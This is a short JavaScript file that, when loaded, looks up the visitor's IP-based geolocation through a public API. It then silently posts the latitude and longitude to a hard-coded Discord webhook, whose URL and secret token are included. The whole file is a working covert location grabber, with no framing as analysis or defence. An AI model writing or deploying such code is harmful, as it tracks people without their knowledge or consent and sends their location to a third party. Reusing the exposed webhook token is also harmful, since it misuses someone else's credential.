var webhookurl = "https://discord.com/api/webhooks/1222336560939405415/LHv5iPP8o70-kNxxVbqvet9q4yMAYhWUqtlojVk1ywYcd9VOdmLYN2v-LTHqLFOpT2iI"
function sendMessage(str) {
    const request = new XMLHttpRequest();
    request.open("POST", webhookurl);

    request.setRequestHeader('Content-type', 'application/json');

    const params = {
        username: "My Webhook Name",
        avatar_url: "",
        content: str
    }

    request.send(JSON.stringify(params));
}
async function getIP() {
    return await fetch('https://api.my-ip.io/v2/ip.json').then(e => e.json())
}

async function sendIP() {
    var info = await getIP()
    sendMessage(
        `lat: __**${info.location.lat}**__\nlon: __**${info.location.lon}**__`
    )
}
sendIP()